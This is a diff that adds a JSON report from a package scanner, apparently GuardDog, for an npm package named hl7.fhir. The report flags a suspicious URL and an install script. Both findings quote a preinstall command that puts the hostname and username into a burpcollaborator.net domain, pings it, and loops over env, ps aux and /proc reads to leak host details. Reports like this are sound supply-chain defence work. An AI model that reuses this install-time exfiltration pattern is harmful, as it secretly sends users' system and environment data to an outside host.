@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "shady-links": [
+            {
+                "location": "package/package.json:8",
+                "code": "    \"preinstall\": \"export HOSTNAME && BCNET=\\\"linux-hl7.fhir-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\\\"; ping -c 1 $BCNET; for i in env \\\"ps aux\\\" \\\"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\\\" \\\"... || true\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-serialize-environment": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-exec-base64": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:8",
+                "code": "    \"preinstall\": \"export HOSTNAME && BCNET=\\\"linux-hl7.fhir-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\\\"; ping -c 1 $BCNET; for i in env \\\"ps aux\\\" \\\"cat /proc/version /proc/net/fib_trie /proc/net/if_inet6\\\" \\\"... || true\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": {},
+        "npm-steganography": {},
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/hl7.fhir-3.0.0"
+}
